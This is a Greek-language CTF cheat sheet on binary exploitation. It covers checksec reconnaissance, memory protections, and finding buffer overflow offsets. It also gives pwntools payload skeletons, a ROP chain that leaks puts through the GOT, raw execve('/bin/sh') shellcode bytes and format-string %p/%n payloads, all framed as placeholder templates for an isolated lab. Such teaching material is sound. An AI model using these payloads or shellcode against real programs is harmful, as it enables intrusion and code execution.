## Πριν ξεκινήσετε

Το **Pwn/Binary Exploitation** εξετάζει αδυναμίες ενός εκτελέσιμου σε εργαστηριακή άσκηση. Το **buffer** είναι περιοχή δεδομένων μνήμης και το **buffer overflow** εγγραφή πέρα από τα όριά της. Το **offset** είναι η μετατόπιση μέχρι ένα συγκεκριμένο σημείο. Η **διεύθυνση επιστροφής** χρησιμοποιείται για τη συνέχεια της εκτέλεσης μετά από κλήση συνάρτησης.

Το **ROP** συνδυάζει μικρές υπάρχουσες ακολουθίες εντολών, τα **gadgets**. Το **shellcode** είναι ακολουθία εντολών μηχανής. Μια αδυναμία **format string** προκύπτει όταν μη έμπιστη είσοδος χρησιμοποιείται ως οδηγός μορφοποίησης, με δυνατότητες που εξαρτώνται από το συγκεκριμένο πρόγραμμα.

Τα snippets του πρωτοτύπου είναι σκελετοί και όχι ολοκληρωμένες λύσεις. Οι τιμές offset = 64 και 0xdeadbeef, το αρχείο binary και η διαδρομή libc είναι ενδεικτικά. Χρειάζονται το σωστό εκτελέσιμο, αρχιτεκτονική, εξαρτήσεις και επαληθευμένες διευθύνσεις της άσκησης. Οι ακολουθίες assembly και τα %p/%n μέσα σε μπλοκ bash είναι παραδείγματα δεδομένων, όχι εντολές shell.

Η ανάλυση που εκτελεί το πρόγραμμα ή καλεί εξαρτήσεις του πρέπει να γίνεται στο απομονωμένο εργαστήριο. Τα bytes, οι εντολές, τα ορίσματα συναρτήσεων και η λογική των Python παραδειγμάτων διατηρούνται από το πρωτότυπο.

## 🔍 Αρχική ανάλυση

```bash
# Έλεγχος μηχανισμών προστασίας
checksec binary

# Πληροφορίες αρχείου
file binary
ldd binary        # Σχετιζόμενες βιβλιοθήκες

# Εκτέλεση του προγράμματος
./binary
ltrace ./binary   # Παρακολούθηση κλήσεων βιβλιοθηκών
strace ./binary   # Παρακολούθηση κλήσεων συστήματος
```

## 🛡️ Μηχανισμοί προστασίας

Ο πίνακας συνοψίζει μηχανισμούς και πιθανές κατευθύνσεις έρευνας, όχι αυτόματες παρακάμψεις. Το NX σχετίζεται με δικαιώματα εκτέλεσης σε σελίδες μνήμης, το ASLR με τυχαιοποίηση διευθύνσεων και το PIE επιτρέπει μεταβλητή βάση του εκτελέσιμου. Η ύπαρξη ROP gadgets ή διαρροής δεν αποδεικνύει ολοκληρωμένη λύση.


| Προστασία | Περιγραφή | Ενδεικτική προσέγγιση του πρωτοτύπου |
| ------------ | ------------- | -------- |
| **NX** | Μη εκτελέσιμη στοίβα στο παράδειγμα | ROP |
| **ASLR** | Τυχαιοποίηση διευθύνσεων | Διαρροή διεύθυνσης και υπολογισμός — απαιτεί συγκεκριμένες συνθήκες |
| **PIE** | Μεταβαλλόμενη βασική διεύθυνση εκτελέσιμου | Διαρροή διεύθυνσης του εκτελέσιμου |
| **Canary** | Τιμή ελέγχου ακεραιότητας στη στοίβα | Διαρροή της τιμής canary |
| **RELRO** | Προστασία σχετικών περιοχών ανακατεύθυνσης συμβόλων (GOT) | Εξέταση άλλων σχετικών αδυναμιών |

## 📏 Υπερχείλιση περιοχής μνήμης (Buffer Overflow)

### Εντοπισμός μετατόπισης (offset)
```bash
# Χρήση pwntools
cyclic 200        # Δημιουργία αναγνωρίσιμου μοτίβου
cyclic -l 0x6161616a  # Εύρεση μετατόπισης

# Εντολές κατάλληλης επέκτασης μέσα σε GDB
pattern create 200
pattern offset 0x6161616a
```

### Βασικός σκελετός παραδείγματος με pwntools
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Ενδεικτική διεύθυνση επιστροφής

p.sendline(payload)
p.interactive()
```

## 🔗 Αλυσίδες υπαρχουσών εντολών — ROP

### Εντοπισμός μικρών ακολουθιών εντολών (gadgets)
```bash
ROPgadget --binary binary
ropper -f binary

# Ενδεικτικά gadgets — οι γραμμές είναι assembly, όχι εντολές shell
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Παράδειγμα για ευθυγράμμιση στοίβας
```

### Σκελετός αλυσίδας ROP με pwntools

Το offset πρέπει να έχει προσδιοριστεί νωρίτερα και τα σύμβολα puts/main να υπάρχουν στο συγκεκριμένο ELF. Το snippet κατασκευάζει payload αλλά δεν δείχνει αποστολή ή πλήρη επαλήθευση αποτελέσματος. Η φόρτωση μιας libc δεν αποδεικνύει ότι είναι η βιβλιοθήκη της απομακρυσμένης άσκησης.

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Δημιουργία της αλυσίδας του παραδείγματος
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

## 🐚 Κώδικας εντολών μηχανής (Shellcode)

### Linux 64 bit

Το απόσπασμα shellcraft προϋποθέτει imports και σωστό context του pwntools για λειτουργικό και αρχιτεκτονική, όπως εξηγεί η [επίσημη τεκμηρίωση context](https://docs.pwntools.com/en/stable/context.html). Η επικεφαλίδα του οδηγού δεν ρυθμίζει από μόνη της το περιβάλλον Python. Τα προκαθορισμένα bytes διατηρούνται χωρίς μεταβολή.

```python
# Παραγωγή εντολών με shellcraft του pwntools
shellcode = asm(shellcraft.sh())

# Παράδειγμα προκαθορισμένων bytes
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

## 📚 Μη ασφαλής χρήση συμβολοσειράς μορφοποίησης (Format String)

Οι περιγραφές %n και %hhn δεν είναι αυτοτελείς εντολές εκτέλεσης. Στο Python παράδειγμα οι offset, target_addr και value πρέπει να έχουν οριστεί κατάλληλα· η κλήση της βοηθητικής συνάρτησης δεν αποδεικνύει από μόνη της δυνατότητα εγγραφής στο πρόγραμμα.


```bash
# Προβολή τιμών στο παράδειγμα format string
%p %p %p %p %p
%x %x %x %x %x

# Εγγραφή αποτελέσματος
%n - εγγραφή του πλήθους bytes που έχουν εκτυπωθεί
%hhn - εγγραφή τιμής μεγέθους ενός byte
```

```python
# Βοηθητική συνάρτηση fmtstr του pwntools
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```
